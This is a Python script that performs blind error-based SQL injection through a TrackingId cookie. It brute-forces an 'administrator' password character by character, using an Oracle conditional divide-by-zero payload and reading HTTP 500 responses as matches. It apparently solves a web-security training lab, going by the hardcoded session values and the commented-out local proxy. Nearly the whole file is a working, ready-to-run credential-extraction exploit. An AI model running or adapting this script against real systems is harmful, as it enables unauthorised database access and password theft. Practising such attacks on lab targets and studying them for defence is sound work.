import sys
import requests
import urllib3
import urllib.parse

# Disable insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxy settings
# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def sqli_password(url):
    password_extracted = ""
    for i in range(1, 21):
        for j in range(32, 126):
            sqli_payload = f"' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND ASCII(SUBSTR(password, {i}, 1))={j}) || '"
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': f'E1X4EhtOffCQKtcU{sqli_payload_encoded}',
                       'session': '7RUuB2rdDa7LRV7kf3OGjfdmuAgPMGbX'}
            response = requests.get(
                url, cookies=cookies, verify=False)

            if response.status_code == 500:
                password_extracted += chr(j)
                sys.stdout.write(f'\r{password_extracted}')
                sys.stdout.flush()
                break
            else:
                sys.stdout.write(f'\r{password_extracted}{chr(j)}')
                sys.stdout.flush()


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    sqli_password(url)


if __name__ == "__main__":
    main()
